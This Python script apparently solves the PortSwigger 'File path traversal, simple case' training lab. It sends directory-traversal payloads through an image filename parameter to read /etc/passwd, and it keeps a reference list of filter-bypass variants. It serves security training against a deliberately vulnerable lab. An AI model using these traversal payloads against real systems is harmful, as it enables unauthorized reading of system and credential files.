#!/usr/bin/env python3
"""
Solve the PortSwigger lab "File path traversal, simple case".

Product images load via /image?filename=<name>. The filename isn't
sanitised, so a traversal sequence climbs out of the image directory and
reads an arbitrary file — here, /etc/passwd.

Lab: https://portswigger.net/web-security/file-path-traversal/lab-simple
Usage: python3 solve.py https://YOUR-LAB-ID.web-security-academy.net
"""

import sys
import argparse
import requests

# Verify TLS against the OS trust store (works on networks that inspect HTTPS).
import truststore
truststore.inject_into_ssl()

session = requests.Session()
LAB_URL = None  # set from the CLI arg in main()
REQUEST_TIMEOUT = 10

# First payload solves this lab; the rest are a reference of bypass
# techniques for the harder path-traversal labs (loop returns on first hit).
TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",                    # no filtering — plain relative traversal (this lab)
    "/etc/passwd",                            # app blocks ../ but trusts an absolute path
    "....//....//....//etc/passwd",           # app strips "../" once; "....//" collapses back to "../"
    "/var/www/images/../../../etc/passwd",    # app requires a known base dir, then you climb out of it
]

# /etc/passwd always starts with this, so it confirms a real file read.
SUCCESS_MARKER = "root:"


def fetch(path, method="GET"):
    """Send a request to the lab and return the response."""
    url = LAB_URL.rstrip("/") + "/" + path.lstrip("/")
    return session.request(method, url, timeout=REQUEST_TIMEOUT)


def report(name, found, detail=""):
    """Print a finding in a consistent [FOUND] / [clean] format."""
    tag = "FOUND" if found else "clean"
    print(f"[{tag}] {name}: {detail}")


def check_path_traversal():
    for payload in TRAVERSAL_PAYLOADS:
        response = fetch(f"image?filename={payload}")
        if SUCCESS_MARKER in response.text:
            report("Path traversal", True, f"read /etc/passwd via {payload}")
            return
    report("Path traversal", False, "no file read")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Detect file path traversal via an image filename parameter (PortSwigger lab)."
    )
    parser.add_argument(
        "url",
        help="Base URL of your lab instance, e.g. https://XXXX.web-security-academy.net",
    )
    return parser.parse_args()


def main():
    global LAB_URL
    args = parse_args()
    LAB_URL = args.url

    try:
        check_path_traversal()
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()